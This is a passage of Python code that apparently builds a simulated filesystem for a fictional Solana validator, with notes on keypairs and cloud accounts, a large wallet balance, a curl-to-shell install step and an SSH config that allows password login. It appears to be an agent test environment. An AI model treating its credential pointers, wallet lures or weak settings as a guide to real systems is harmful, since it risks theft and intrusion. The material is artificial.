        "\n"
        "## Hardware\n"
        "Provider:     Equinix Metal c3.medium.x86\n"
        "CPU:          AMD EPYC 7402P 24-core\n"
        "RAM:          256 GB DDR4\n"
        "Disk:         2x 1.92 TB NVMe (RAID-0 for ledger)\n"
        "Monthly cost: ~$510 USD\n"
        "\n"
        "## Software\n"
        "OS:           Ubuntu 22.04.3 LTS\n"
        "Solana:       1.17.6 (mainnet-beta)\n"
        "Kernel:       5.15.0-75-generic\n"
        "\n"
        "## Keys / Credentials\n"
        "Validator identity keypair:  /home/solana/validator-keypair.json\n"
        "Vote account keypair:        /home/solana/vote-account-keypair.json\n"
        "Withdraw authority:          same as identity (see private_keys_backup.txt)\n"
        "AWS backup IAM:              ~/.aws/credentials [validator-backup] profile\n"
        "                             (s3://solana-validator-snapshots-prod)\n"
        "\n"
        "## Useful one-liners\n"
        "# Check catchup status\n"
        "solana catchup --our-localhost\n"
        "# Vote account info\n"
        "solana vote-account 7nXgWKMEjQA5T2HkNekDGRvwcUEiXPuKgRMHAvtSJjAD\n"
        "# Withdraw commission\n"
        "solana withdraw-from-vote-account /home/solana/vote-account-keypair.json \\\n"
        "  9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM <AMOUNT>\n"
        "\n"
        "## Recovery (if validator crashes)\n"
        "1. Check: tail -f /home/solana/logs/validator.log\n"
        "2. Restart: sudo systemctl restart solana-validator\n"
        "3. If DB corrupted: rm -rf ledger/rocksdb && restart (re-syncs ~4hrs)\n"
        "4. Emergency: restore from S3 snapshot (see recovery_plan.txt)\n"
        "\n"
        "## Known issues\n"
        "- Validator occasionally stalls during heavy network load (>2500 TPS)\n"
        "- RocksDB compaction spikes disk I/O — normal, don't restart\n"
        "- Watchtower false alarms on slot 8001 port — firewall blip\n"
    ),

    "/home/solana/notes/cloud_accounts.txt": (
        "# Cloud & Service Account Summary — Meridian Staking\n"
        "# Keep this file OFFLINE. Should not be on prod server.\n"
        "\n"
        "## AWS\n"
        "Account ID:   491822374912\n"
        "Region:       us-east-2\n"
        "IAM User:     solana-validator-backup (read-only S3)\n"
        "Bucket:       s3://solana-validator-snapshots-prod\n"
        "Credentials:  see ~/.aws/credentials [validator-backup]\n"
        "\n"
        "## Monitoring\n"
        "Grafana Cloud:  https://grafana.meridianstaking.io\n"
        "Login:          ops@meridianstaking.io\n"
        "Password:       see Bitwarden vault 'Meridian / Grafana'\n"
        "\n"
        "## Domain Registrar\n"
        "Provider:  Namesilo\n"
        "Email:     james@meridianstaking.io\n"
        "Domains:   meridianstaking.io, meridian-validator.com\n"
        "\n"
        "## Equinix Metal\n"
        "URL:       https://console.equinix.com\n"
        "Login:     james@meridianstaking.io\n"
        "Project:   meridian-solana-prod\n"
        "API token: stored in Bitwarden 'Meridian / Equinix API'\n"
        "\n"
        "## Bitwarden (password manager)\n"
        "URL:    https://vault.bitwarden.com\n"
        "Email:  james@meridianstaking.io\n"
        "2FA:    TOTP (Authy on personal phone)\n"
        "\n"
        "## Telegram Bot (validator alerts)\n"
        "Bot token: stored in /home/solana/monitoring/alerts_config.json\n"
        "Chat ID:   -1001823749201\n"
        "\n"
        "## Twitter / X\n"
        "Handle:  @MeridianStaking\n"
        "Login:   james@meridianstaking.io\n"
    ),

    "/home/solana/notes/recovery_plan.txt": (
        "# Disaster Recovery Plan — Meridian Staking\n"
        "# validator-node-01\n"
        "\n"
        "## Scenario 1: Validator process crash\n"
        "Check:   systemctl status solana-validator\n"
        "Logs:    tail -100 /home/solana/logs/validator.log\n"
        "Fix:     sudo systemctl restart solana-validator\n"
        "Alert:   if slot gap > 150, post to Discord (#validator-status)\n"
        "\n"
        "## Scenario 2: Full server failure\n"
        "1. Provision replacement server (Equinix Metal c3.medium.x86)\n"
        "   - Use saved config in ~/infra/provision.sh\n"
        "2. Restore latest snapshot:\n"
        "   aws s3 cp s3://solana-validator-snapshots-prod/latest.tar.zst /tmp/\n"
        "   tar -I zstd -xf /tmp/latest.tar.zst -C /home/solana/ledger/\n"
        "3. Copy keypairs from ENCRYPTED OFFLINE BACKUP (Bitwarden → 'Meridian Keypairs')\n"
        "   - validator-keypair.json\n"
        "   - vote-account-keypair.json\n"
        "4. Start validator: ./start-validator.sh\n"
        "5. Monitor catchup: solana catchup --our-localhost\n"
        "   Expect 2-4 hours to full catchup from snapshot\n"
        "6. Notify delegators via @MeridianStaking on Twitter\n"
        "\n"
        "## Scenario 3: Key compromise\n"
        "IMMEDIATELY:\n"
        "1. Transfer all SOL from identity wallet to emergency cold wallet\n"
        "   Emergency cold wallet pubkey: 4mKxPqV7B8jFzrHeLDsGnWAaQkT9CvE2NrXuMpBdYsZo\n"
        "2. Generate new identity keypair: solana-keygen new -o new-validator-keypair.json\n"
        "3. Set new vote account identity: solana vote-authorize-voter-checked ...\n"
        "4. Revoke old AWS credentials immediately\n"
        "5. Contact Solana Foundation (validator@solana.com)\n"
        "\n"
        "## Emergency Contacts\n"
        "James Mercer:       +1-503-867-5309  /  james@meridianstaking.io\n"
        "Equinix Support:    support@equinixmetal.com  (ticket: mention project 'meridian-solana-prod')\n"
        "Solana Foundation:  validator@solana.com\n"
        "Chorus One (stake): hello@chorus.one\n"
    ),

    "/home/solana/notes/server_build.txt": (
        "# Server Build Log — validator-node-01\n"
        "# 2023-08-14 JM\n"
        "\n"
        "08:04  Provisioned c3.medium.x86 via Equinix Metal API\n"
        "08:11  SSH access confirmed (root key from Bitwarden)\n"
        "08:15  apt update && apt upgrade -y  [reboot required for kernel]\n"
        "08:34  Added user 'solana', copied .ssh authorized_keys\n"
        "08:37  Disabled root SSH login\n"
        "08:41  Configured ufw: allow 22,8001,8899/tcp; deny all else\n"
        "08:50  Mounted NVMe drives, created RAID-0 at /mnt/ledger\n"
        "09:12  Installed Solana 1.17.6 from release tarball\n"
        "09:44  Copied validator-keypair.json from offline USB\n"
        "09:46  Copied vote-account-keypair.json from offline USB\n"
        "09:51  Created systemd service unit: /etc/systemd/system/solana-validator.service\n"
        "10:03  First start — validator initializing\n"
        "10:07  Downloading snapshot from entrypoint (287 GB)\n"
        "14:22  Snapshot complete, validator caught up to slot 265,891,234\n"
        "14:30  Configured watchtower alerts → Telegram\n"
        "14:45  Configured S3 snapshot cron job (every 2 hours)\n"
        "15:01  Server fully operational. Monitoring active.\n"
        "\n"
        "Note: keypairs should NOT remain on this machine long-term.\n"
        "      Physical backup stored at home in fireproof safe.\n"
    ),

    # ── Staking financial records ─────────────────────────────────────────────
    "/home/solana/staking/rewards_history.csv": (
        "epoch,start_slot,end_slot,rewards_sol,commission_pct,commission_sol,net_to_delegators\n"
        "476,277531000,277962000,13.102,8,1.048,12.054\n"
        "477,277962000,278393000,12.884,8,1.031,11.853\n"
        "478,278393000,278824000,13.441,8,1.075,12.366\n"
        "479,278824000,279255000,11.223,8,0.898,10.325\n"
        "480,279255000,279686000,13.891,8,1.111,12.780\n"
        "481,279686000,280117000,9.334,8,0.747,8.587\n"
        "482,280117000,280548000,13.102,8,1.048,12.054\n"
        "483,280548000,280979000,14.221,8,1.138,13.083\n"
        "484,280979000,281410000,13.778,8,1.102,12.676\n"
        "485,281410000,281841000,12.993,8,1.039,11.954\n"
        "486,281841000,282272000,13.445,8,1.076,12.369\n"
        "487,282272000,282703000,14.002,8,1.120,12.882\n"
        "488,282703000,283134000,13.558,8,1.085,12.473\n"
        "489,283134000,283565000,13.112,8,1.049,12.063\n"
        "490,283565000,283996000,12.778,8,1.022,11.756\n"
        "491,283996000,284427000,14.334,8,1.147,13.187\n"
        "492,284427000,284858000,13.891,8,1.111,12.780\n"
        "493,284858000,285289000,13.002,8,1.040,11.962\n"
        "494,285289000,285720000,14.112,8,1.129,12.983\n"
        "495,285720000,286151000,13.667,8,1.093,12.574\n"
        "496,286151000,286582000,13.445,8,1.076,12.369\n"
        "497,286582000,287013000,12.889,8,1.031,11.858\n"
        "498,287013000,287444000,13.334,8,1.067,12.267\n"
        "499,287444000,287834000,13.102,8,1.048,12.054\n"
    ),

    "/home/solana/staking/delegation_info.txt": (
        "# Active Delegations — validator-node-01\n"
        "# Identity:    9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "# Vote Acct:   7nXgWKMEjQA5T2HkNekDGRvwcUEiXPuKgRMHAvtSJjAD\n"
        "# Last updated: 2024-01-15\n"
        "\n"
        "Total Active Stake:   892,341.54 SOL\n"
        "Total Delegators:     147\n"
        "Commission Rate:      8%\n"
        "Skip Rate (30d):      1.2%\n"
        "Uptime (30d):         99.94%\n"
        "\n"
        "--- Top 10 Delegators ---\n"
        "1.  6xAV4Kp3GhEjHnBfz2QeMrTsDcWuLkYcP8rN9voE3kL  122,500.000 SOL  Coinbase Custody\n"
        "2.  8GmP9VnR4TsWqEjFhzYkBmCdLpKwXuE7iHtMoV2sXFb  98,240.000 SOL   Chorus One\n"
        "3.  3tRqL7vBnPuWJeZsDfGaYcAnLmKzVtE6iGsM2rWEbxCc  74,120.500 SOL   Jump Crypto\n"
        "4.  5kHwXnPuTJeRBsEfGaYcAnLmKzVtE6iGsMoU1rWEbxCc  58,900.000 SOL   anonymous\n"
        "5.  9pDmVqR3TsWqEjFhzYkBmCdLpKwXuE7iHtMoV2sXFb   41,200.750 SOL   FTX Recovery Trust\n"
        "6.  2nKxPqV7B8jFzrHeLDsGnWAaQkT9CvE2NrXuMpBdYsZo 37,850.000 SOL   anonymous\n"
        "7.  4mRqL7vBnPuWJeZsDfGaYcAnLmKzVtE6iGsMoU1rWEb  29,400.000 SOL   Mango Markets\n"
        "8.  7hTwVqR3TsWqEjFhzYkBmCdLpKwXuE7iHtMoV2sXFba  21,350.500 SOL   anonymous\n"
        "9.  1jNxPqV7B8jFzrHeLDsGnWAaQkT9CvE2NrXuMpBdYsZ  18,900.000 SOL   Solend Protocol\n"
        "10. 6kMwXnPuTJeRBsEfGaYcAnLmKzVtE6iGsMoU1rWEbxC  15,200.000 SOL   anonymous\n"
        "\n"
        "--- Stake Growth ---\n"
        "2023-09-01:  312,100 SOL\n"
        "2023-10-01:  498,220 SOL\n"
        "2023-11-01:  611,440 SOL\n"
        "2023-12-01:  778,990 SOL\n"
        "2024-01-01:  892,341 SOL\n"
        "\n"
        "# See rewards_history.csv for per-epoch commission breakdown\n"
    ),

    "/home/solana/staking/q1_2024_summary.txt": (
        "# Q1 2024 Staking Performance — Meridian Staking\n"
        "# validator-node-01\n"
        "\n"
        "Period:                 2024-01-01 to 2024-03-31\n"
        "Epochs covered:         476 to 530\n"
        "\n"
        "Total block rewards:    843.22 SOL\n"
        "Commission earned:       67.46 SOL  (~$12,682 USD at avg $188/SOL)\n"
        "Net to delegators:      775.76 SOL\n"
        "Effective delegator APY: 6.78%\n"
        "\n"
        "Uptime:                 99.94%  (21 min downtime — kernel update, epoch 481)\n"
        "Vote efficiency:        98.71%\n"
        "Skip rate:               1.29%\n"
        "Delinquency events:      0\n"
        "\n"
        "Average stake:          831,450 SOL\n"
        "End-of-period stake:    892,341 SOL  (+7.3% growth)\n"
        "\n"
        "Validator pubkey:  9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "Vote account:      7nXgWKMEjQA5T2HkNekDGRvwcUEiXPuKgRMHAvtSJjAD\n"
        "\n"
        "--- Commission Withdrawal History Q1 ---\n"
        "2024-01-31:  21.34 SOL withdrawn to 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "2024-02-29:  23.12 SOL withdrawn to 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "2024-03-31:  23.00 SOL withdrawn to 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "Total withdrawn: 67.46 SOL\n"
        "\n"
        "Current identity wallet balance: 47,832 SOL (staking + commission)\n"
        "Note: Large balance — need to move most to cold wallet ASAP\n"
    ),

    "/home/solana/staking/commission_history.txt": (
        "# Commission Rate History — Meridian Staking\n"
        "\n"
        "2023-08-14  10%  (initial launch)\n"
        "2023-09-22   8%  (reduced to attract delegators, announced on Twitter)\n"
        "2023-12-01   8%  (unchanged)\n"
        "2024-01-15   8%  (unchanged — considering drop to 7% to compete)\n"
        "\n"
        "Competitors:\n"
        "  Lido (node 3):   5%\n"
        "  Chorus One:      8%\n"
        "  Jump Crypto:     0%  (institutional — whale only)\n"
        "  Coinbase:        8%\n"
        "  Foundation:      0%  (capped at 1.5M SOL)\n"
        "\n"
        "Note: dropping to 7% could increase stake by ~15% based on analytics\n"
        "      but reduces per-SOL revenue — net neutral unless stake > 1M SOL\n"
    ),

    "/home/solana/staking/wallet_ledger.txt": (
        "# Identity Wallet Transaction Ledger\n"
        "# Pubkey: 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "# Manual log — cross-check with explorer.solana.com\n"
        "\n"
        "2023-08-14  +10.00 SOL    Initial deposit (validator identity funding)\n"
        "2023-09-22  +21.34 SOL    Commission withdrawal epoch 476-485\n"
        "2023-10-31  +22.11 SOL    Commission withdrawal epoch 486-496\n"
        "2023-11-30  +19.87 SOL    Commission withdrawal epoch 497-507\n"
        "2023-12-31  +23.55 SOL    Commission withdrawal epoch 508-519\n"
        "2024-01-31  +21.34 SOL    Commission withdrawal epoch 520-530\n"
        "2024-01-31  -0.05 SOL     tx fees\n"
        "\n"
        "Current balance: 47,832.00 SOL\n"
        "\n"
        "WARNING: balance includes staking delegation.  Do NOT transfer full balance.\n"
        "         Only commission portion (~118 SOL) is available to withdraw.\n"
        "         Moving stake balance will deactivate validator.\n"
    ),

    # ── Infrastructure config files ───────────────────────────────────────────
    "/home/solana/infra/provision.sh": (
        "#!/bin/bash\n"
        "# Provision new Equinix Metal validator server\n"
        "# Usage: ./provision.sh <server-ip>\n"
        "set -e\n"
        "\n"
        "SERVER=$1\n"
        "USER=solana\n"
        "\n"
        "echo \"[+] Updating packages\"\n"
        "ssh root@$SERVER 'apt update && apt upgrade -y && apt install -y \\\n"
        "  build-essential pkg-config libssl-dev libudev-dev zstd curl wget git'\n"
        "\n"
        "echo \"[+] Creating solana user\"\n"
        "ssh root@$SERVER 'useradd -m -s /bin/bash solana && \\\n"
        "  mkdir -p /home/solana/.ssh && \\\n"
        "  cp /root/.ssh/authorized_keys /home/solana/.ssh/ && \\\n"
        "  chown -R solana:solana /home/solana/.ssh'\n"
        "\n"
        "echo \"[+] Setting up NVMe RAID-0 for ledger\"\n"
        "ssh root@$SERVER 'mdadm --create /dev/md0 --level=0 --raid-devices=2 /dev/nvme0n1 /dev/nvme1n1 && \\\n"
        "  mkfs.ext4 /dev/md0 && \\\n"
        "  mkdir -p /home/solana/ledger && \\\n"
        "  mount /dev/md0 /home/solana/ledger && \\\n"
        "  echo \"/dev/md0 /home/solana/ledger ext4 defaults 0 0\" >> /etc/fstab'\n"
        "\n"
        "echo \"[+] Installing Solana 1.17.6\"\n"
        "ssh solana@$SERVER 'sh -c \"$(curl -sSfL https://release.solana.com/v1.17.6/install)\"'\n"
        "\n"
        "echo \"[+] Configuring firewall\"\n"
        "ssh root@$SERVER 'ufw default deny incoming && \\\n"
        "  ufw allow 22/tcp && \\\n"
        "  ufw allow 8001:8020/tcp && \\\n"
        "  ufw allow 8001:8020/udp && \\\n"
        "  ufw allow 8899/tcp && \\\n"
        "  ufw enable'\n"
        "\n"
        "echo \"[+] Done. Copy keypairs manually from offline backup.\"\n"
        "echo \"    See ~/notes/recovery_plan.txt for key transfer procedure.\"\n"
    ),

    "/home/solana/infra/terraform.tfvars": (
        "# Equinix Metal — Terraform variables\n"
        "# DO NOT COMMIT — contains API credentials\n"
        "\n"
        "equinix_auth_token  = \"REDACTED_see_bitwarden\"\n"
        "equinix_project_id  = \"a3f821b4-9d2e-4c5f-b6a1-8e3d7f2c9b41\"\n"
        "metro               = \"sv\"\n"
        "plan                = \"c3.medium.x86\"\n"
        "os                  = \"ubuntu_22_04\"\n"
        "hostname            = \"validator-node-01\"\n"
        "ssh_key_name        = \"james-meridian\"\n"
        "aws_region          = \"us-east-2\"\n"
        "s3_snapshot_bucket  = \"solana-validator-snapshots-prod\"\n"
        "aws_access_key_id   = \"REDACTED_see_bitwarden\"\n"
        "aws_secret_key      = \"REDACTED_see_bitwarden\"\n"
        "telegram_bot_token  = \"REDACTED_see_bitwarden\"\n"
        "telegram_chat_id    = \"-1001823749201\"\n"
        "alert_email         = \"ops@meridianstaking.io\"\n"
        "\n"
        "# Grafana Cloud\n"
        "grafana_url         = \"https://grafana.meridianstaking.io\"\n"
        "grafana_api_key     = \"REDACTED_see_bitwarden\"\n"
    ),

    "/home/solana/infra/firewall_rules.txt": (
        "# Firewall Rules — validator-node-01\n"
        "# Last updated: 2023-09-01\n"
        "\n"
        "ufw status verbose:\n"
        "Status: active\n"
        "Logging: on (low)\n"
        "Default: deny (incoming), allow (outgoing), disabled (routed)\n"
        "\n"
        "To                         Action      From\n"
        "--                         ------      ----\n"
        "22/tcp                     ALLOW IN    Anywhere\n"
        "8001:8020/tcp              ALLOW IN    Anywhere\n"
        "8001:8020/udp              ALLOW IN    Anywhere\n"
        "8899/tcp                   ALLOW IN    Anywhere\n"
        "22/tcp (v6)                ALLOW IN    Anywhere (v6)\n"
        "8001:8020/tcp (v6)         ALLOW IN    Anywhere (v6)\n"
        "8001:8020/udp (v6)         ALLOW IN    Anywhere (v6)\n"
        "8899/tcp (v6)              ALLOW IN    Anywhere (v6)\n"
        "\n"
        "Notes:\n"
        "  - Port 8900 (RPC websocket) intentionally NOT exposed externally\n"
        "  - SSH key auth only — password auth disabled in sshd_config\n"
        "  - Consider rate-limiting port 22 to reduce brute force noise\n"
        "  - No ingress on 8900 needed since we don't serve public websocket\n"
    ),

    "/home/solana/infra/monitoring_config.txt": (
        "# Monitoring Setup — Meridian Staking\n"
        "\n"
        "## Solana Watchtower\n"
        "Service:   /home/solana/bin/solana-watchtower\n"
        "Config:    --validator-identity 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "           --interval 30\n"
        "Alerts:    Telegram → @MeridianStaking bot\n"
        "\n"
        "## Node Exporter + Grafana\n"
        "Exporter:  http://localhost:9100/metrics\n"
        "Grafana:   https://grafana.meridianstaking.io\n"
        "Dashboard: 'Solana Validator Overview' (ID: 12345)\n"
        "Alerts:    email → ops@meridianstaking.io\n"
        "\n"
        "## Cron Health Checks\n"
        "# Every 10 minutes — check validator is voting\n"
        "*/10 * * * * /home/solana/bin/solana catchup --our-localhost >> /home/solana/logs/catchup.log 2>&1\n"
        "# Every 2 hours — upload snapshot to S3\n"
        "0 */2 * * * /home/solana/bin/solana-validator wait-for-restart-window --max-delinquent-stake 10 && \\\n"
        "  tar -I zstd -cf /tmp/snapshot.tar.zst /home/solana/ledger/snapshots/ && \\\n"
        "  aws s3 cp /tmp/snapshot.tar.zst s3://solana-validator-snapshots-prod/latest.tar.zst\n"
        "\n"
        "## Alert Thresholds\n"
        "  Slot skip rate > 5%:      WARN\n"
        "  Slot skip rate > 10%:     CRITICAL\n"
        "  Behind by > 100 slots:    CRITICAL\n"
        "  Delinquent:               PAGE (Telegram + email)\n"
        "  Disk usage > 80%:         WARN\n"
        "  Disk usage > 90%:         CRITICAL\n"
        "  RAM usage > 90%:          WARN\n"
    ),

    "/etc/ssh/sshd_config": (
        "# This is the sshd server system-wide configuration file.\n"
        "Port 22\n"
        "AddressFamily any\n"
        "ListenAddress 0.0.0.0\n"
        "ListenAddress ::\n"
        "HostKey /etc/ssh/ssh_host_rsa_key\n"
        "HostKey /etc/ssh/ssh_host_ecdsa_key\n"
        "HostKey /etc/ssh/ssh_host_ed25519_key\n"
        "SyslogFacility AUTH\n"
        "LogLevel INFO\n"
        "LoginGraceTime 2m\n"
        "PermitRootLogin prohibit-password\n"
        "StrictModes yes\n"
        "MaxAuthTries 6\n"
        "PubkeyAuthentication yes\n"
        "PasswordAuthentication yes\n"
        "PermitEmptyPasswords no\n"
        "ChallengeResponseAuthentication no\n"
        "UsePAM yes\n"
        "X11Forwarding yes\n"
        "PrintMotd no\n"
        "AcceptEnv LANG LC_*\n"
        "Subsystem sftp /usr/lib/openssh/sftp-server\n"
    ),
}


def resolve_path(cwd: str, path: str) -> str:
    """Resolve an absolute or relative path given current working directory."""
    if path.startswith("/"):
        resolved = path
    else:
        resolved = cwd.rstrip("/") + "/" + path

    parts = []
    for part in resolved.split("/"):
        if part == "..":
            if parts:
                parts.pop()
        elif part and part != ".":
            parts.append(part)
    return "/" + "/".join(parts)


def is_dir(path: str) -> bool:
    return path in DIRECTORY_TREE


def is_file(path: str) -> bool:
    return path in FILES


def path_exists(path: str) -> bool:
    return is_dir(path) or is_file(path)


def list_dir(path: str) -> list[tuple[str, bool]] | None:
    return DIRECTORY_TREE.get(path)


def read_file(path: str) -> str | None:
    return FILES.get(path)
